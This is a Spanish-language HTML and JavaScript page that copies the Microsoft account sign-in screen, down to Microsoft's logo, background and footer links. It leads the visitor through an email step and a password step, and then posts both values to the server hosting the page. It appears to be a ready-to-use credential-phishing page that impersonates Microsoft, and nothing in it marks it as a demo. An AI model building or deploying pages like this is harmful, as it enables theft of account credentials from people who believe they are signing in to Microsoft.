<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Portal de acceso</title>
<style>
  :root {
    --brand: #0067b8;
    --brand-hover: #005da6;
    --text: #1b1b1b;
    --text-secondary: #605e5c;
    --error: #e81123;
    --font: "Segoe UI", -apple-system, BlinkMacSystemFont, Roboto, Helvetica, Arial, sans-serif;
  }
  * { box-sizing: border-box; }
  body {
    margin: 0;
    font-family: var(--font);
    color: var(--text);
    min-height: 100vh;
    display: flex;
    align-items: center;
    justify-content: center;
    /* Fondo SVG desde tu sitio. Si no carga, cae a un degradado claro tipo la imagen. */
    background: url("https://aadcdn.msftauth.net/shared/1.0/content/images/backgrounds/4_eae2dd7eb3a55636dc2d74f4fa4c386e.svg") center / cover no-repeat,
                linear-gradient(135deg, #f4f2f7 0%, #e8ecf3 50%, #eef1f6 100%);
    padding: 24px;
  }
  /* El contenedor fija el ancho y apila las dos cards */
  .wrap {
    width: 100%;
    max-width: 440px;
    display: flex;
    flex-direction: column;
    gap: 20px;
  }
  .card {
    width: 100%;
    background: #fff;
    box-shadow: 0 2px 6px rgba(0,0,0,.15);
    padding: 44px;
  }
  /* Segunda card: la fila entera es el botón */
  .options-card {
    width: 100%;
    background: #fff;
    box-shadow: 0 2px 6px rgba(0,0,0,.15);
  }
  .options-row {
    display: flex;
    align-items: center;
    gap: 16px;
    width: 100%;
    padding: 8px 44px;
    background: none;
    border: none;
    font-family: inherit;
    font-size: 15px;
    color: var(--text);
    text-align: left;
    cursor: pointer;
  }
  .options-row:hover { background: #f3f3f3; }
  .options-row img { flex: 0 0 auto; width: 32px; height: 32px; }
  #root > section { animation: rise .2s ease; }
  @keyframes rise { from { opacity: 0; transform: translateY(6px); } to { opacity: 1; transform: none; } }
  /* Logo: un solo SVG (icono + letras) servido desde tu sitio */
  .logo-img {
    height: 24px;
    display: block;
    margin-bottom: 16px;
  }
  h1 { font-size: 24px; font-weight: 600; margin: 0 0 16px; }
  .identity { display: flex; align-items: center; gap: 8px; margin-bottom: 16px; font-size: 15px; }
  .back-arrow { background: none; border: none; cursor: pointer; font-size: 20px; line-height: 1; color: var(--text); padding: 0; }
  /* Error arriba del input, como en la referencia */
  .error { color: var(--error); font-size: 13px; line-height: 1.35; margin: 0 0 4px; }
  .error:empty { margin: 0; }
  .field { margin: 8px 0 0; }
  input[type="email"], input[type="password"] {
    width: 100%; border: none; border-bottom: 1px solid var(--text);
    padding: 6px 0; font-size: 15px; font-family: inherit; background: transparent; outline: none;
  }
  input:focus { border-bottom: 1px solid var(--text); }
  /* Estado de error: subrayado rojo, se mantiene aun con foco */
  input.input-error, input.input-error:focus { border-bottom: 1px solid var(--error); }
  .links { font-size: 13px; margin: 18px 0 0; }
  .links a { color: var(--brand); text-decoration: none; }
  .links a:hover { text-decoration: underline; color: #999999; }
  .actions { display: flex; justify-content: flex-end; gap: 4px; margin-top: 30px; }
  button.btn {
    min-width: 108px; height: 32px; border: none;
    font-size: 15px; font-family: inherit; cursor: pointer;
  }
  .btn-primary { background: var(--brand); color: #fff; }
  .btn-primary:hover { background: var(--brand-hover); }
  .btn-primary:disabled { background: #c8c6c4; cursor: default; }
  .btn-secondary { background: #e1e1e1; color: var(--text); }
  .btn-secondary:hover { background: #d2d2d2; }
  .muted { color: var(--text-secondary); font-size: 14px; }
  /* Oculta visualmente pero deja el campo accesible a gestores de contraseñas y lectores */
  .visually-hidden {
    position: absolute; width: 1px; height: 1px; padding: 0; margin: -1px;
    overflow: hidden; clip: rect(0 0 0 0); white-space: nowrap; border: 0;
  }
  .spinner {
    display: inline-block; width: 14px; height: 14px;
    border: 2px solid rgba(255,255,255,.4); border-top-color: #fff;
    border-radius: 50%; animation: spin .6s linear infinite;
  }
  @keyframes spin { to { transform: rotate(360deg); } }
  .footer { position: fixed; bottom: 0px; right: 0px; }
  .footer .footer-item {
    color: #000; font-size: 12px; line-height: 28px;
    white-space: nowrap; display: inline-block;
    margin: 0 8px; text-decoration: none; cursor: pointer;
  }
  .footer .footer-item:hover { text-decoration: underline; }
  .footer .debug-item { font-weight: 700; letter-spacing: 2px; }
  @media (max-width: 480px) {
    body { padding: 0; align-items: stretch; }
    .wrap { max-width: none; gap: 8px; }
    .card { box-shadow: none; padding: 44px 24px; }
    .options-row { padding: 8px 24px; }
  }
</style>
</head>
<body>
  <div class="wrap">
    <main class="card" role="main">
      <img class="logo-img" src="https://aadcdn.msftauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg" alt="Microsoft">
      <form id="loginForm" method="POST" action="" novalidate>
        <div id="root"></div>
      </form>
    </main>
    <div class="options-card" id="options-card">
      <button class="options-row" id="options-btn">
        <img src="https://aadcdn.msftauth.net/shared/1.0/content/images/signin-options_3e3f6b73c3f310c31d2c4d131a8ab8c6.svg" alt="">
        Opciones de inicio de sesión
      </button>
    </div>
  </div>
  <footer class="footer ext-footer" id="footer" role="contentinfo">
    <div id="footerLinks" class="footer-links text-secondary">
      <a id="ftrTerms" class="footer-content footer-item" href="https://aadcdn.msftauth.net/ests/2.1.24760.3/content/agreements/tou/es/tou.txt">Términos de uso</a>
      <a id="ftrPrivacy" class="footer-content footer-item" href="https://aadcdn.msftauth.net/ests/2.1.24760.3/content/agreements/privacy/es-mx/privacy.txt">Privacidad y cookies</a>
      <a id="moreOptions" class="footer-content footer-item debug-item" href="#" role="button"
         aria-label="Haz clic aquí para obtener información sobre la solución de problemas."
         aria-expanded="false">...</a>
    </div>
  </footer>

<script>
"use strict";

/* ---------- Máquina de estados: solo transiciones de paso ---------- */
const initial = { step: "identifier", data: {} };

function reducer(s, action) {
  switch (action.type) {
    case "ADVANCE": return { ...s, step: action.step, data: { ...s.data, ...action.data } };
    case "BACK":    return { ...s, step: "identifier" };
    default:        return s;
  }
}

let state = initial;
let liveOn = false;
function dispatch(action) {
  state = reducer(state, action);
  render();
}

/* ---------- Transición asíncrona (fuera del reducer) ---------- */
async function resolveCredentialType(identifier) {
  await new Promise(r => setTimeout(r, 500));
  const domain = identifier.split("@")[1] || "";
  if (domain === "external.com") return { method: "federated", idp: "https://sso.external.com" };
  return { method: "password" };
}
function validId(v) {
  return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(v) || /^\+?\d[\d\s]{6,}$/.test(v);
}

const INVALID_ID_MSG = "Escribe una dirección de correo, un número de teléfono o un usuario válidos.";

/* ---------- Helpers de UI imperativa (sin re-render) ---------- */
function setLoading(btn, on, label) {
  if (!btn) return;
  btn.disabled = on;
  btn.innerHTML = on ? '<span class="spinner"></span>' : label;
}
function showError(msg) {
  const el = document.querySelector(".error");
  if (el) el.textContent = msg || "";
}
function liveCheck(input) {
  if (!validId(input.value.trim())) {
    showError(INVALID_ID_MSG);
    input.classList.add("input-error");
  } else {
    showError("");
    input.classList.remove("input-error");
  }
}

// Paso 1: valida el identificador (custom) y avanza. El paso 2 NO pasa por aquí:
// hace submit nativo del form (POST real con usuario + contraseña).
async function next(identifier) {
  liveOn = true;
  const input = document.getElementById("email");
  if (!identifier || !validId(identifier)) {
    showError(INVALID_ID_MSG);
    if (input) input.classList.add("input-error");
    return;
  }
  const btn = document.getElementById("next-btn");
  setLoading(btn, true);
  try {
    const res = await resolveCredentialType(identifier);
    dispatch({
      type: "ADVANCE",
      step: res.method === "federated" ? "federated" : "password",
      data: { identifier },
    });
  } catch {
    setLoading(btn, false, "Siguiente");
    showError("Error de red. Intenta de nuevo.");
  }
}

/* ---------- Vistas: solo el CONTENIDO del form persistente ---------- */
const esc = (s) => s.replace(/[&<>"]/g, c => ({ "&":"&amp;","<":"&lt;",">":"&gt;","\"":"&quot;" }[c]));

const views = {
  identifier: () => `
    <section>
      <h1>Iniciar sesión</h1>
      <p class="error" role="alert" aria-live="assertive"></p>
      <div class="field">
        <input type="email" id="email" name="email" autocomplete="username"
               placeholder="Correo electrónico, teléfono o usuario" autofocus>
      </div>
      <p class="links">¿Todavía no tienes una cuenta? <a href="#">Crea una ahora mismo</a></p>
      <p class="links"><a href="#">¿No puedes acceder a tu cuenta?</a></p>
      <div class="actions">
        <button type="button" class="btn btn-secondary" id="back-reload-btn">Atrás</button>
        <button type="submit" class="btn btn-primary" id="next-btn">Siguiente</button>
      </div>
    </section>`,

  // Paso 2: usuario (oculto, del paso 1) + contraseña + submit. Submit nativo real.
  password: () => `
    <section>
      <div class="identity">
        <button type="button" class="back-arrow" id="back-btn" aria-label="Volver">&larr;</button>
        <span>${esc(state.data.identifier || "")}</span>
      </div>
      <h1>Escribir contraseña</h1>
      <p class="error" role="alert" aria-live="assertive"></p>
      <input type="text" name="email" autocomplete="username" class="visually-hidden"
             value="${esc(state.data.identifier || "")}" readonly tabindex="-1" aria-hidden="true">
      <div class="field">
        <input type="password" id="password" name="password" autocomplete="current-password"
               placeholder="Contraseña" autofocus>
      </div>
      <p class="links"><a href="#">¿Olvidaste tu contraseña?</a></p>
      <div class="actions">
        <button type="submit" class="btn btn-primary" id="signin-btn">Iniciar sesión</button>
      </div>
    </section>`,

  federated: () => `
    <section>
      <div class="identity">
        <button type="button" class="back-arrow" id="back-btn" aria-label="Volver">&larr;</button>
        <span>${esc(state.data.identifier || "")}</span>
      </div>
      <h1>Redirigiendo...</h1>
      <p class="muted">Esta cuenta se autentica en el proveedor de identidad de tu organización.</p>
    </section>`,
};

function render() {
  const root = document.getElementById("root");
  root.innerHTML = views[state.step]();
  document.getElementById("options-card").style.display = state.step === "identifier" ? "" : "none";
  bind();
  const input = root.querySelector("input[autofocus]");
  if (input) input.focus();
}

function bind() {
  const email = document.getElementById("email");
  const backBtn = document.getElementById("back-btn");
  const reloadBtn = document.getElementById("back-reload-btn");

  if (email) {
    email.addEventListener("blur", () => {
      const v = email.value.trim();
      if (v && !validId(v)) { liveOn = true; liveCheck(email); }
    });
    email.addEventListener("input", () => { if (liveOn) liveCheck(email); });
  }
  if (backBtn) backBtn.addEventListener("click", () => { liveOn = false; dispatch({ type: "BACK" }); });
  if (reloadBtn) reloadBtn.addEventListener("click", () => location.reload());
}

/* ---------- Submit único ----------
   Paso 1: intercepta y avanza (identifier-first es client-side).
   Paso 2: NO intercepta -> submit nativo del form (POST con email + password). */
document.getElementById("loginForm").addEventListener("submit", (e) => {
  if (state.step === "identifier") {
    e.preventDefault();
    const email = document.getElementById("email");
    next(email ? email.value.trim() : "");
  } else if (state.step === "password") {
    const pass = document.getElementById("password");
    if (!pass || !pass.value) {
      e.preventDefault();
      showError("Escribe tu contraseña.");   // error con estilo, no bocadillo nativo
      if (pass) pass.classList.add("input-error");
    }
    // con contraseña -> se deja pasar -> el navegador hace el POST real
  }
});

document.getElementById("moreOptions").addEventListener("click", (e) => {
  e.preventDefault();
  const el = e.currentTarget;
  const open = el.getAttribute("aria-expanded") === "true";
  el.setAttribute("aria-expanded", (!open).toString());
});

render();
</script>
</body>
</html>
